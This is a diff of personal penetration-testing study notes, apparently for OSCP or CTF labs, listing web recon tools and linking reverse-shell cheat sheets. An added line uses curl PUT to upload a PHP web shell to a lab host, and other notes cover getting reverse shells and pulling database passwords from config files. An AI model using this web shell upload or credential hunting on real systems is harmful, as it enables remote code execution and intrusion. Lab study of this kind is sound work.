@@ -15,14 +15,18 @@
 ## recon
 ### HTTP and HTTPs
 1. dirbuster (gui)
-2. dirb http://10.11.1.115:80/ -o 80_dirb.txt -p proxy:port
-2. nikto -h http://10.11.1.115:80 -output 80_nikto.txt -useproxy http://proxy:port
-3. wpscan to find wordpress problems
-4. cms scan (? todo: read it from a tool)
-5. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
+1. dirb http://10.11.1.115:80/ -o 80_dirb.txt -p proxy:port
+1. nikto -h http://10.11.1.115:80 -output 80_nikto.txt -useproxy http://proxy:port
+1. if there is a `robots.txt`, check if there is anything that the scanners didn't find
+1. also use `curl -i -X OPTIONS http://ip/path` to check what METHODs are available on specific resource
+    - `curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.142.131/test/shell.php`
+1. wpscan to find wordpress problems
+1. cms scan (? todo: read it from a tool)
+1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
     - use `auxiliary/scanner/http/squid_pivot_scanning` metasploit module for squid/proxy scan, ref: [SickOS 1.1](https://highon.coffee/blog/sickos-1-walkthrough/).
-6. for wireshark vulnerability, follow https://highon.coffee/blog/sickos-1-walkthrough/ to get reverse shell via Burp
-7. if there is a MySQL database related to the app, find if any config.php or other php containing the database access id/password.
+1. it's possible that the server only allow certain user-agent to connect. Check it.
+1. for wireshark vulnerability, follow https://highon.coffee/blog/sickos-1-walkthrough/ to get reverse shell via Burp
+1. if there is a MySQL database related to the app, find if any config.php or other php containing the database access id/password.
     ```php
     // Database settings:
     define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
@@ -68,7 +72,8 @@ For CTF / OSCP, should not take you more than 30 mins to crack
 
 
 ## generate reverse shell payload
-- msfvnon
+- msfvnon https://sushant747.gitbooks.io/total-oscp-guide/reverse-shell.html
+- https://highon.coffee/blog/reverse-shell-cheat-sheet/
 - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit
 
 ## convert reverse shell to tty
